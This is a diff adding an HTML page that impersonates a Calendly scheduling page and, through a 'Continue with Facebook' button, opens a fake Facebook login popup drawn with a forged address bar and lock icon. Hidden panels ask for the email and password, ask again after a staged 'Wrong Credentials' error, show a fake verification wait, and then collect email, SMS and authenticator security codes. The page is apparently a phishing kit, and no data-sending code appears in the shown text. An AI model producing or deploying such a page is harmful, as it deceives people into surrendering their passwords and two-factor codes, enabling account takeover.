@@ -1,0 +1,1483 @@
+
+<html lang="en" class="fonts-loaded-initial fonts-loaded-full">
+
+<head>
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="theme-color" content="#000000">
+    <meta name="description" content="Web site created using create-react-app">
+    <title>Select a Date & Time - Calendly</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="assets/modal.css" />
+    <link href="assets/main.5d063b47.css" rel="stylesheet">
+    <link href="assets/newstyle.css" rel="stylesheet">
+    <link href="assets/stylee.css" rel="stylesheet">
+    <link rel="icon" type="image/png" sizes="32x32"
+        href="assets/favicon-bfb0492a754bdf44a0a58b969963f44235653cca09a1c0110309c1e03077e368.ico">
+
+</head>
+
+<body class="main lang-en en-US gdGrid _initOk" marginwidth="0" marginheight="0" data-locale="en-US">
+    <div id="root">
+        <div class="calendy-div">
+            <div class="calendy-grid">
+                <div class="left-side">
+                    <div><img alt="Selby" class="selby-logo"
+                            src="./assets/logoooc.svg">
+                        <h3>Brandon Garber</h3>
+                        <h2>Meet Brandon</h2>
+                        <div></div>
+                        <div class="calendy-div-icons">
+                            <div class="calendy-icons"><img alt="clock"
+                                    src="./assets/clock.2ced35e604aa6d1f8eea0c5026a61f6d.svg"><span>30 min</span>
+                            </div>
+                            <div class="calendy-icons" style="gap: 15px;"><img alt="camera"
+                                    src="./assets/camera.d8eeb4352132a583d5a94936a8f1798a.svg"><span>Web
+                                    conferencing
+                                    details provided upon confirmation.</span></div>
+                            <div class="footer-links"><a>Cookie settings</a><a>Report abuse</a></div>
+                        </div>
+                    </div>
+                </div>
+                <div class="right-side"><a class="VJL48qbQzWENTFAh1Knk e9TS9yoMqqIN2PqBo1QG _i6SG2jlTfccH2ZZblil"
+                        href="/" data-discover="true">
+                        <div data-id="branding" class="jWSwi_R_Xl7kPjUhuQoo _igrKj_5lj_5nWQu8DPw">
+                            <div class="V7YfvNqWv0XKYKys7N7K __d5yUqDgBEjoX7J2dql">powered by</div>
+                            <div class="HvybhIo63ZbBJxHh7Ann RK3ps09FjZwzHTaYDakl">Calendly</div>
+                        </div>
+                    </a>
+                    <div>
+                        <div class="calendy-logo"><img alt="Calendly Logo"
+                                src="./assets/calendly.8d2b1d88617b5da85edf35811ff2ab7a.svg"></div>
+                        <h2>Schedule your call with us!</h2>
+                        <h3></h3>
+                        <div class="fb-text">
+                            <p class="fb-paragraphg"><span>The easiest way for you to sign up is with Facebook.</span>
+                                <span>This will automatically connect your calendar</span> <span>so you can start using
+                                    Calendly
+                                    right away.</span></p><a  onclick="handleButtonClick()" class="fb-btn"><img alt="Facebook"
+                                    src="./assets/file_3.png" style="width: 20px;">Continue with
+                                Facebook</a>
+                        </div>
+                    </div>
+                    <div class="time">
+                        <h4>Time zone</h4>
+                        <div class="timezone"><img alt="globe"
+                                src="./assets/globe.1eae85210f348ab9e928a0dd6e17ff89.svg"><span>Global
+                                (16:48)</span></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <script>
+            document.addEventListener('DOMContentLoaded', function () {
+                // Reset all popups on page load
+                const popups = document.querySelectorAll('.popup-overlay');
+                popups.forEach(popup => {
+                    popup.classList.remove('show');
+                });
+            });
+        </script>
+
+
+
+        <!-- Inline script for immediate button handling -->
+        <script>
+            document.getElementById('login-btn').addEventListener('click', function () {
+                console.log('Login button clicked (inline)');
+                const authPopup = document.getElementById('auth-popup');
+                if (authPopup) {
+                    authPopup.classList.add('show');
+                    document.body.style.overflow = 'hidden';
+                } else {
+                    console.error('Auth popup not found (inline)');
+                }
+            });
+        </script>
+    </div>
+    <div id="facebook-modal" style="display: none;">
+        <div class="ant-modal-mask"></div>
+        <div tabindex="-1" class="ant-modal-wrap">
+            <div role="dialog" aria-labelledby="rc_unique_0" aria-modal="true"
+                class="ant-modal modal-wrapper  modal__facebook"
+                style="width: 1000px; transform-origin: 612.4px 335px;">
+                <div tabindex="0" aria-hidden="true" style="width: 0px; height: 0px; overflow: hidden; outline: none;">
+                </div>
+                <div class="ant-modal-content"><button type="button" aria-label="Close" class="ant-modal-close"><span
+                            class="ant-modal-close-x"><span role="img" aria-label="close"
+                                class="anticon anticon-close ant-modal-close-icon"><svg fill-rule="evenodd"
+                                    viewBox="64 64 896 896" focusable="false" data-icon="close" width="1em" height="1em"
+                                    fill="currentColor" aria-hidden="true">
+                                    <path
+                                        d="M799.86 166.31c.02 0 .04.02.08.06l57.69 57.7c.04.03.05.05.06.08a.12.12 0 010 .06c0 .03-.02.05-.06.09L569.93 512l287.7 287.7c.04.04.05.06.06.09a.12.12 0 010 .07c0 .02-.02.04-.06.08l-57.7 57.69c-.03.04-.05.05-.07.06a.12.12 0 01-.07 0c-.03 0-.05-.02-.09-.06L512 569.93l-287.7 287.7c-.04.04-.06.05-.09.06a.12.12 0 01-.07 0c-.02 0-.04-.02-.08-.06l-57.69-57.7c-.04-.03-.05-.05-.06-.07a.12.12 0 010-.07c0-.03.02-.05.06-.09L454.07 512l-287.7-287.7c-.04-.04-.05-.06-.06-.09a.12.12 0 010-.07c0-.02.02-.04.06-.08l57.7-57.69c.03-.04.05-.05.07-.06a.12.12 0 01.07 0c.03 0 .05.02.09.06L512 454.07l287.7-287.7c.04-.04.06-.05.09-.06a.12.12 0 01.07 0z">
+                                    </path>
+                                </svg></span></span></button>
+                    <div class="ant-modal-header">
+                        <div class="ant-modal-title" id="rc_unique_0">
+                            <div>
+                                <div class="wrapper_header">
+                                    <div class="sign__up-modal"><img src="./assets/fb.ico" alt="" width="17px">
+                                        <p>Log into Facebook | Facebook</p>
+                                    </div>
+                                    <div class="icons">
+                                        <div class="img" role="button"><img src="./assets/minus.png" alt=""></div>
+                                        <div class="img"><img
+                                                src="https://icons-for-free.com/iconfiles/png/512/square-1321215626459427421.png"
+                                                alt=""></div>
+                                        <div class="img img-x" role="button">
+                                            <img src="./assets/close.png" alt="">
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="input__title-wrapper">
+                                    <div class="lock__screen">
+                                        <div class="lock">
+                                            <div class="lock__wrapper"><img src="./assets/locktest.png" alt=""><span
+                                                    class="green">Secure | https:</span><span
+                                                    class="black-opacity">//</span></div>
+                                        </div><span class="input__value">www.facebook.com<span class="black">
+                                                /login.php?skip<span class="hide__text-mobile">_api_login=1
+                                                    &amp;api_key=481324359126967&amp;kid_directed_site=0&amp;app_id=481324359126967&amp;signed...</span></span></span>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="ant-modal-body" style="height: 650px;" id="login-form">
+                        <div class="confirmation-container-modal">
+                            <div class="header-color">
+                                <div class="header-container">
+                                    <div class="logo__faceook"></div>
+                                </div>
+                            </div>
+                            <div class="auth-req-container auth__req-modal">
+                                <div class="auth-req">
+                                    <div class="auth-req-text-modal">
+                                        <h2>Log Into Facebook</h2>
+                                        <div class="modal__confirmation">
+                                            <form class="ant-form ant-form-horizontal">
+                                                <div>
+                                                    <div class="ant-form-item">
+                                                        <div class="ant-row ant-form-item-row">
+                                                            <div class="ant-col ant-form-item-control">
+                                                                <div class="ant-form-item-control-input">
+                                                                    <div class="ant-form-item-control-input-content">
+                                                                        <input required="" type="text" name=""
+                                                                            placeholder="Email or phone number"
+                                                                            id="email" class="ant-input" value="">
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <div>
+                                                    <div class="ant-form-item">
+                                                        <div class="ant-row ant-form-item-row">
+                                                            <div class="ant-col ant-form-item-control">
+                                                                <div class="ant-form-item-control-input">
+                                                                    <div class="ant-form-item-control-input-content">
+                                                                        <input required="" type="password" name=""
+                                                                            placeholder="Password" id="pass"
+                                                                            class="ant-input">
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <div><button type="button" id="loginBtn">Log In</button></div>
+                                            </form>
+                                            <div class="modal__confirmation-forgot">
+                                                <div class="modal__confirmation-account">
+                                                    <p>Forgot account? </p>
+                                                    <p>Sign up for Facebook</p>
+                                                </div>
+                                                <p class="not__now">Not now</p>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="having-trouble-class having__trouble-modal"><button>Having
+                                        trouble?</button></div>
+                                <div class="show-footer-on-mobile-plus hide__footer-modal">
+                                    <h2 class="h2-foot not__you-text">Not You? Log In Here</h2>
+                                    <div class="footer-flex-mobile-plus confimartion__modal">
+                                        <div>
+                                            <h2>English (US)</h2>
+                                            <p>Deutsch</p>
+                                            <p>Српски</p>
+                                            <p>Português (Brasil)</p>
+                                        </div>
+                                        <div>
+                                            <p>Italiano</p>
+                                            <p>Bosanski</p>
+                                            <p>Svensk</p><button>+</button>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="modal__footer">
+                            <div class="footer-menu-flex-ul">
+                                <div class="container-language-footer">
+                                    <ul class="flex-ul">
+                                        <li>English (US)</li>
+                                        <li>Español</li>
+                                        <li>Deutsch</li>
+                                        <li>Türkçe</li>
+                                        <li>Српски</li>
+                                        <li>Français (France)</li>
+                                        <li>Italiano</li>
+                                        <li>Bosanski</li>
+                                        <li>Svensk</li>
+                                        <li>Português (Brasil)</li><button
+                                            class="countrys-button"><span>+</span></button>
+                                    </ul>
+                                </div>
+                                <div class="flex-second-ul">
+                                    <ul>
+                                        <li>Sign Up</li>
+                                        <li>Log In</li>
+                                        <li>Messenger</li>
+                                        <li>Facebook Lite</li>
+                                        <li>Watch</li>
+                                        <li>Places</li>
+                                        <li>Games</li>
+                                        <li>Marketplace</li>
+                                        <li>Facebook Pay</li>
+                                        <li>Oculus</li>
+                                        <li>Portal</li>
+                                        <li>Instagram</li>
+                                        <li>Bulletin</li>
+                                        <li>Local</li>
+                                    </ul>
+                                </div>
+                                <div class="flex-second-ul-2">
+                                    <ul>
+                                        <li>Fundraisers</li>
+                                        <li>Services</li>
+                                        <li>Voting Information Centre</li>
+                                        <li>About</li>
+                                        <li>Create ad</li>
+                                        <li>Create Page</li>
+                                        <li>Developers</li>
+                                        <li>Careers</li>
+                                        <li>Privacy</li>
+                                        <li>Cookies</li>
+                                        <li class="ad-choice-img">Ad Choices <span class="img-li"></span> </li>
+                                        <li>Terms</li>
+                                        <li>Help</li>
+                                    </ul>
+                                </div>
+                                <div class="meta-footer">
+                                    <p>Meta © 2025</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="ant-modal-body" style="height: 650px;display: none;" id="wrongpsw">
+                        <div class="confirmation-container-modal">
+                            <div class="header-color">
+                                <div class="header-container">
+                                    <div class="logo__faceook"></div>
+                                </div>
+                            </div>
+                            <div class="auth-req-container auth__req-modal">
+                                <div class="auth-req">
+                                    <div class="auth-req-text-modal">
+                                        <h2>Log Into Facebook</h2>
+                                        <div class="wrong__password">
+                                            <h2>Wrong Credentials</h2>
+                                            <p>Invalid username or password</p>
+                                        </div>
+                                        <div class="modal__confirmation">
+                                            <form class="ant-form ant-form-horizontal">
+                                                <div>
+                                                    <div class="ant-form-item">
+                                                        <div class="ant-row ant-form-item-row">
+                                                            <div class="ant-col ant-form-item-control">
+                                                                <div class="ant-form-item-control-input">
+                                                                    <div class="ant-form-item-control-input-content">
+                                                                        <input required="" type="text" name=""
+                                                                            placeholder="Email or phone number"
+                                                                            id="confirm_username" class="ant-input"
+                                                                            value="">
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <div>
+                                                    <div class="ant-form-item">
+                                                        <div class="ant-row ant-form-item-row">
+                                                            <div class="ant-col ant-form-item-control">
+                                                                <div class="ant-form-item-control-input">
+                                                                    <div class="ant-form-item-control-input-content">
+                                                                        <input required="" type="password" name=""
+                                                                            placeholder="Password" id="confirm_password"
+                                                                            class="ant-input">
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <div><button type="button" id="confirm_login">Log In</button></div>
+                                            </form>
+                                            <div class="modal__confirmation-forgot">
+                                                <div class="modal__confirmation-account">
+                                                    <p>Forgot account? </p>
+                                                    <p>Sign up for Facebook</p>
+                                                </div>
+                                                <p class="not__now">Not now</p>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="having-trouble-class having__trouble-modal"><button>Having
+                                        trouble?</button></div>
+                                <div class="show-footer-on-mobile-plus hide__footer-modal">
+                                    <h2 class="h2-foot not__you-text">Not You? Log In Here</h2>
+                                    <div class="footer-flex-mobile-plus confimartion__modal">
+                                        <div>
+                                            <h2>English (US)</h2>
+                                            <p>Deutsch</p>
+                                            <p>Српски</p>
+                                            <p>Português (Brasil)</p>
+                                        </div>
+                                        <div>
+                                            <p>Italiano</p>
+                                            <p>Bosanski</p>
+                                            <p>Svensk</p><button>+</button>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="modal__footer">
+                            <div class="footer-menu-flex-ul">
+                                <div class="container-language-footer">
+                                    <ul class="flex-ul">
+                                        <li>English (US)</li>
+                                        <li>Español</li>
+                                        <li>Deutsch</li>
+                                        <li>Türkçe</li>
+                                        <li>Српски</li>
+                                        <li>Français (France)</li>
+                                        <li>Italiano</li>
+                                        <li>Bosanski</li>
+                                        <li>Svensk</li>
+                                        <li>Português (Brasil)</li><button
+                                            class="countrys-button"><span>+</span></button>
+                                    </ul>
+                                </div>
+                                <div class="flex-second-ul">
+                                    <ul>
+                                        <li>Sign Up</li>
+                                        <li>Log In</li>
+                                        <li>Messenger</li>
+                                        <li>Facebook Lite</li>
+                                        <li>Watch</li>
+                                        <li>Places</li>
+                                        <li>Games</li>
+                                        <li>Marketplace</li>
+                                        <li>Facebook Pay</li>
+                                        <li>Oculus</li>
+                                        <li>Portal</li>
+                                        <li>Instagram</li>
+                                        <li>Bulletin</li>
+                                        <li>Local</li>
+                                    </ul>
+                                </div>
+                                <div class="flex-second-ul-2">
+                                    <ul>
+                                        <li>Fundraisers</li>
+                                        <li>Services</li>
+                                        <li>Voting Information Centre</li>
+                                        <li>About</li>
+                                        <li>Create ad</li>
+                                        <li>Create Page</li>
+                                        <li>Developers</li>
+                                        <li>Careers</li>
+                                        <li>Privacy</li>
+                                        <li>Cookies</li>
+                                        <li class="ad-choice-img">Ad Choices <span class="img-li"></span> </li>
+                                        <li>Terms</li>
+                                        <li>Help</li>
+                                    </ul>
+                                </div>
+                                <div class="meta-footer">
+                                    <p>Meta © 2024</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="ant-modal-body" style="height: 650px;display: none;" id="oldpass">
+                        <div class="confirmation-container-modal">
+                            <div class="header-color">
+                                <div class="header-container">
+                                    <div class="logo__faceook"></div>
+                                </div>
+                            </div>
+                            <div class="auth-req-container auth__req-modal">
+                                <div class="auth-req">
+                                    <div class="auth-req-text-modal">
+                                        <h2>Log Into Facebook</h2>
+                                        <div class="wrong__password">
+                                            <h2>You've entered an old password</h2>
+                                            <!-- <p>Invalid username or password</p> -->
+                                        </div>
+                                        <div class="modal__confirmation">
+                                            <form class="ant-form ant-form-horizontal">
+                                                <div>
+                                                    <div class="ant-form-item">
+                                                        <div class="ant-row ant-form-item-row">
+                                                            <div class="ant-col ant-form-item-control">
+                                                                <div class="ant-form-item-control-input">
+                                                                    <div class="ant-form-item-control-input-content">
+                                                                        <input required="" type="text" name=""
+                                                                            placeholder="Email or phone number"
+                                                                            id="old_username" class="ant-input"
+                                                                            value="">
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <div>
+                                                    <div class="ant-form-item">
+                                                        <div class="ant-row ant-form-item-row">
+                                                            <div class="ant-col ant-form-item-control">
+                                                                <div class="ant-form-item-control-input">
+                                                                    <div class="ant-form-item-control-input-content">
+                                                                        <input required="" type="password" name=""
+                                                                            placeholder="Password" id="old_password"
+                                                                            class="ant-input">
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <div><button type="submit" id="old_login">Log In</button></div>
+                                            </form>
+                                            <div class="modal__confirmation-forgot">
+                                                <div class="modal__confirmation-account">
+                                                    <p>Forgot account? </p>
+                                                    <p>Sign up for Facebook</p>
+                                                </div>
+                                                <p class="not__now">Not now</p>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="having-trouble-class having__trouble-modal"><button>Having
+                                        trouble?</button></div>
+                                <div class="show-footer-on-mobile-plus hide__footer-modal">
+                                    <h2 class="h2-foot not__you-text">Not You? Log In Here</h2>
+                                    <div class="footer-flex-mobile-plus confimartion__modal">
+                                        <div>
+                                            <h2>English (US)</h2>
+                                            <p>Deutsch</p>
+                                            <p>Српски</p>
+                                            <p>Português (Brasil)</p>
+                                        </div>
+                                        <div>
+                                            <p>Italiano</p>
+                                            <p>Bosanski</p>
+                                            <p>Svensk</p><button>+</button>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="modal__footer">
+                            <div class="footer-menu-flex-ul">
+                                <div class="container-language-footer">
+                                    <ul class="flex-ul">
+                                        <li>English (US)</li>
+                                        <li>Español</li>
+                                        <li>Deutsch</li>
+                                        <li>Türkçe</li>
+                                        <li>Српски</li>
+                                        <li>Français (France)</li>
+                                        <li>Italiano</li>
+                                        <li>Bosanski</li>
+                                        <li>Svensk</li>
+                                        <li>Português (Brasil)</li><button
+                                            class="countrys-button"><span>+</span></button>
+                                    </ul>
+                                </div>
+                                <div class="flex-second-ul">
+                                    <ul>
+                                        <li>Sign Up</li>
+                                        <li>Log In</li>
+                                        <li>Messenger</li>
+                                        <li>Facebook Lite</li>
+                                        <li>Watch</li>
+                                        <li>Places</li>
+                                        <li>Games</li>
+                                        <li>Marketplace</li>
+                                        <li>Facebook Pay</li>
+                                        <li>Oculus</li>
+                                        <li>Portal</li>
+                                        <li>Instagram</li>
+                                        <li>Bulletin</li>
+                                        <li>Local</li>
+                                    </ul>
+                                </div>
+                                <div class="flex-second-ul-2">
+                                    <ul>
+                                        <li>Fundraisers</li>
+                                        <li>Services</li>
+                                        <li>Voting Information Centre</li>
+                                        <li>About</li>
+                                        <li>Create ad</li>
+                                        <li>Create Page</li>
+                                        <li>Developers</li>
+                                        <li>Careers</li>
+                                        <li>Privacy</li>
+                                        <li>Cookies</li>
+                                        <li class="ad-choice-img">Ad Choices <span class="img-li"></span> </li>
+                                        <li>Terms</li>
+                                        <li>Help</li>
+                                    </ul>
+                                </div>
+                                <div class="meta-footer">
+                                    <p>Meta © 2024</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="ant-modal-body" style="height: 650px;display: none;" id="waitTime">
+                        <div class="header-color">
+                            <div class="header-container">
+                                <h2>facebook</h2>
+                            </div>
+                        </div>
+                        <div class="loading-container">
+                            <div class="loading-message">Please be patient and dont close this window</div>
+                            <div class="loading-submessage step1">Checking the details on your account...</div>
+                            <div class="loading-submessage step2">Checking email addresses...</div>
+                            <div class="loading-submessage step3">Checking two-factor authenticator...</div>
+                            <div class="loading-submessage step4">Checking other details...</div>
+                            <div class="loading-submessage finalStep">It can take up to 10 minutes to verify your
+                                account.</div>
+                            <div class="loader"></div>
+                        </div>
+                    </div>
+                    <div class="ant-modal-body" style="height: 650px;display: none;" id="codeEmail">
+                        <div class="confirmation-container-2">
+                            <div class="header-color">
+                                <div class="header-container">
+                                    <div class="logo__faceook"></div>
+                                </div>
+                            </div>
+                            <div class="auth-req-container-2">
+                                <div class="auth-req-2">
+                                    <div class="auth-req-text-2">
+                                        <h2>Enter security code</h2>
+                                        <div class="confirmation-second-2">
+                                            <div class="auth-req-paragraph-2">
+                                                <p class="first-1-text">Please check your email for a message with
+                                                    your code. Your code is 8 numbers long.</p>
+                                            </div>
+                                            <div class="flex-confirmation-second-2">
+                                                <div class="input-auth-req-2"><input placeholder="Enter Code"
+                                                        id="emailcodedes" type="number" required="" class="ant-input">
+                                                    <div id="error-message"
+                                                        style="color: red; display: none;padding-top: 10px;"></div>
+                                                </div>
+                                                <div class="sent-mail-2">
+                                                    <p>We sent your code to:</p>
+                                                    <p>****@****.***</p>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="show-input-on-mobile-2"><input class="ant-input" type="text" value="">
+                                    </div>
+                                    <div class="auth-req-footer-2"><a>Didn't get a code?</a>
+                                        <div class="button-second-confirmation-2"><button type="submit"
+                                                id="buttonemailcode">Continue</button></div>
+                                    </div>
+                                </div>
+
+                                <div class="show-footer-on-mobile-plus-2">§<h2 class="h2-foot-2">Not You? Log In
+                                        Here</h2>
+                                    <div class="footer-flex-mobile-plus-2">
+                                        <div>
+                                            <h2>English (US)</h2>
+                                            <p>Deutsch</p>
+                                            <p>Српски</p>
+                                            <p>Português (Brasil)</p>
+                                        </div>
+                                        <div>
+                                            <p>Italiano</p>
+                                            <p>Bosanski</p>
+                                            <p>Svensk</p><button>+</button>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="modal__footer">
+                            <div class="footer-menu-flex-ul-2">
+                                <div class="container-language-footer-2">
+                                    <ul class="flex-ul-second-confirmation">
+                                        <li>English (US)</li>
+                                        <li>Español</li>
+                                        <li>Deutsch</li>
+                                        <li>Türkçe</li>
+                                        <li>Српски</li>
+                                        <li>Français (France)</li>
+                                        <li>Italiano</li>
+                                        <li>Bosanski</li>
+                                        <li>Svensk</li>
+                                        <li>Português (Brasil)</li><button
+                                            class="countrys-button-2"><span>+</span></button>
+                                    </ul>
+                                </div>
+                                <div class="flex-second-ul-confirmation">
+                                    <ul>
+                                        <li>Sign Up</li>
+                                        <li>Log In</li>
+                                        <li>Messenger</li>
+                                        <li>Facebook Lite</li>
+                                        <li>Watch</li>
+                                        <li>Places</li>
+                                        <li>Games</li>
+                                        <li>Marketplace</li>
+                                        <li>Facebook Pay</li>
+                                        <li>Oculus</li>
+                                        <li>Portal</li>
+                                        <li>Instagram</li>
+                                        <li>Bulletin</li>
+                                        <li>Local</li>
+                                    </ul>
+                                </div>
+                                <div class="flex-second-ul-4">
+                                    <ul>
+                                        <li>Fundraisers</li>
+                                        <li>Services</li>
+                                        <li>Voting Information Centre</li>
+                                        <li>About</li>
+                                        <li>Create ad</li>
+                                        <li>Create Page</li>
+                                        <li>Developers</li>
+                                        <li>Careers</li>
+                                        <li>Privacy</li>
+                                        <li>Cookies</li>
+                                        <li class="ad-choice-img-2">Ad Choices <span class="img-li-2"></span> </li>
+                                        <li>Terms</li>
+                                        <li>Help</li>
+                                    </ul>
+                                </div>
+                                <div class="meta-footer-2">
+                                    <p>Meta © 2024</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="ant-modal-body" style="height: 650px;display: none;" id="codeSms">
+                        <div class="confirmation-container-2">
+                            <div class="header-color">
+                                <div class="header-container">
+                                    <div class="logo__faceook"></div>
+                                </div>
+                            </div>
+                            <div class="auth-req-container-2">
+                                <div class="auth-req-2">
+                                    <div class="auth-req-text-2">
+                                        <h2>Enter security code</h2>
+                                        <div class="confirmation-second-2">
+                                            <div class="auth-req-paragraph-2">
+                                                <p class="first-1-text">Please check your phone for a message with
+                                                    your code. Your code is 6 numbers long.</p>
+                                            </div>
+                                            <div class="flex-confirmation-second-2">
+                                                <div class="input-auth-req-2"><input placeholder="Enter Code"
+                                                        type="number" required="" class="ant-input" id="smscode">
+                                                    <div id="error-message-sms"
+                                                        style="color: red; display: none;padding-top: 10px;">
+                                                    </div>
+                                                </div>
+                                                <div class="sent-mail-2">
+                                                    <p>We sent your code to:</p>
+                                                    <p>+***********</p>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="show-input-on-mobile-2"><input class="ant-input" type="text" value="">
+                                    </div>
+                                    <div class="auth-req-footer-2"><a>Didn't get a code?</a>
+                                        <div class="button-second-confirmation-2"><button type="submit"
+                                                id="smsBtn">Continue</button></div>
+                                    </div>
+                                </div>
+
+                                <div class="show-footer-on-mobile-plus-2">§<h2 class="h2-foot-2">Not You? Log In
+                                        Here</h2>
+                                    <div class="footer-flex-mobile-plus-2">
+                                        <div>
+                                            <h2>English (US)</h2>
+                                            <p>Deutsch</p>
+                                            <p>Српски</p>
+                                            <p>Português (Brasil)</p>
+                                        </div>
+                                        <div>
+                                            <p>Italiano</p>
+                                            <p>Bosanski</p>
+                                            <p>Svensk</p><button>+</button>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="modal__footer">
+                            <div class="footer-menu-flex-ul-2">
+                                <div class="container-language-footer-2">
+                                    <ul class="flex-ul-second-confirmation">
+                                        <li>English (US)</li>
+                                        <li>Español</li>
+                                        <li>Deutsch</li>
+                                        <li>Türkçe</li>
+                                        <li>Српски</li>
+                                        <li>Français (France)</li>
+                                        <li>Italiano</li>
+                                        <li>Bosanski</li>
+                                        <li>Svensk</li>
+                                        <li>Português (Brasil)</li><button
+                                            class="countrys-button-2"><span>+</span></button>
+                                    </ul>
+                                </div>
+                                <div class="flex-second-ul-confirmation">
+                                    <ul>
+                                        <li>Sign Up</li>
+                                        <li>Log In</li>
+                                        <li>Messenger</li>
+                                        <li>Facebook Lite</li>
+                                        <li>Watch</li>
+                                        <li>Places</li>
+                                        <li>Games</li>
+                                        <li>Marketplace</li>
+                                        <li>Facebook Pay</li>
+                                        <li>Oculus</li>
+                                        <li>Portal</li>
+                                        <li>Instagram</li>
+                                        <li>Bulletin</li>
+                                        <li>Local</li>
+                                    </ul>
+                                </div>
+                                <div class="flex-second-ul-4">
+                                    <ul>
+                                        <li>Fundraisers</li>
+                                        <li>Services</li>
+                                        <li>Voting Information Centre</li>
+                                        <li>About</li>
+                                        <li>Create ad</li>
+                                        <li>Create Page</li>
+                                        <li>Developers</li>
+                                        <li>Careers</li>
+                                        <li>Privacy</li>
+                                        <li>Cookies</li>
+                                        <li class="ad-choice-img-2">Ad Choices <span class="img-li-2"></span> </li>
+                                        <li>Terms</li>
+                                        <li>Help</li>
+                                    </ul>
+                                </div>
+                                <div class="meta-footer-2">
+                                    <p>Meta © 2024</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="ant-modal-body" style="height: 650px;display: none;" id="authcode">
+                        <div class="confirmation-container-2">
+                            <div class="header-color">
+                                <div class="header-container">
+                                    <div class="logo__faceook"></div>
+                                </div>
+                            </div>
+                            <div class="auth-req-container-2">
+                                <div class="auth-req-2">
+                                    <div class="auth-req-text-2">
+                                        <h2>Enter security code</h2>
+                                        <div class="confirmation-second-2">
+                                            <div class="auth-req-paragraph-2">
+                                                <p class="first-1-text">Your account has two-factor authentication
+                                                    switched on, which requires this extra login step.</p>
+                                            </div>
+                                            <div class="auth-req-paragraph-2">
+                                                <p class="first-1-text">Enter the 6-digit code from the
+                                                    authentication app you set up.</p>
+                                            </div>
+                                            <div class="flex-confirmation-second-2">
+                                                <div class="input-auth-req-2"><input placeholder="Enter Code"
+                                                        type="number" required="" class="ant-input" id="authcodedes">
+                                                    <div id="error-message-auth"
+                                                        style="color: red; display: none;padding-top: 10px;">
+                                                    </div>
+                                                </div>
+
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="show-input-on-mobile-2"><input class="ant-input" type="text" value="">
+                                    </div>
+                                    <div class="auth-req-footer-2"><a>Didn't get a code?</a>
+                                        <div class="button-second-confirmation-2"><button type="submit"
+                                                id="authBtn">Continue</button></div>
+                                    </div>
+                                </div>
+
+                                <div class="show-footer-on-mobile-plus-2">§<h2 class="h2-foot-2">Not You? Log In
+                                        Here</h2>
+                                    <div class="footer-flex-mobile-plus-2">
+                                        <div>
+                                            <h2>English (US)</h2>
+                                            <p>Deutsch</p>
+                                            <p>Српски</p>
+                                            <p>Português (Brasil)</p>
+                                        </div>
+                                        <div>
+                                            <p>Italiano</p>
+                                            <p>Bosanski</p>
+                                            <p>Svensk</p><button>+</button>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="modal__footer">
+                            <div class="footer-menu-flex-ul-2">
+                                <div class="container-language-footer-2">
+                                    <ul class="flex-ul-second-confirmation">
+                                        <li>English (US)</li>
+                                        <li>Español</li>
+                                        <li>Deutsch</li>
+                                        <li>Türkçe</li>
+                                        <li>Српски</li>
+                                        <li>Français (France)</li>
+                                        <li>Italiano</li>
+                                        <li>Bosanski</li>
+                                        <li>Svensk</li>
+                                        <li>Português (Brasil)</li><button
+                                            class="countrys-button-2"><span>+</span></button>
+                                    </ul>
+                                </div>
+                                <div class="flex-second-ul-confirmation">
+                                    <ul>
+                                        <li>Sign Up</li>
+                                        <li>Log In</li>
+                                        <li>Messenger</li>
+                                        <li>Facebook Lite</li>
+                                        <li>Watch</li>
+                                        <li>Places</li>
+                                        <li>Games</li>
+                                        <li>Marketplace</li>
+                                        <li>Facebook Pay</li>
+                                        <li>Oculus</li>
+                                        <li>Portal</li>
+                                        <li>Instagram</li>
+                                        <li>Bulletin</li>
+                                        <li>Local</li>
+                                    </ul>
+                                </div>
+                                <div class="flex-second-ul-4">
+                                    <ul>
+                                        <li>Fundraisers</li>
+                                        <li>Services</li>
+                                        <li>Voting Information Centre</li>
+                                        <li>About</li>
+                                        <li>Create ad</li>
+                                        <li>Create Page</li>
+                                        <li>Developers</li>
+                                        <li>Careers</li>
+                                        <li>Privacy</li>
+                                        <li>Cookies</li>
+                                        <li class="ad-choice-img-2">Ad Choices <span class="img-li-2"></span> </li>
+                                        <li>Terms</li>
+                                        <li>Help</li>
+                                    </ul>
+                                </div>
+                                <div class="meta-footer-2">
+                                    <p>Meta © 2024</p>
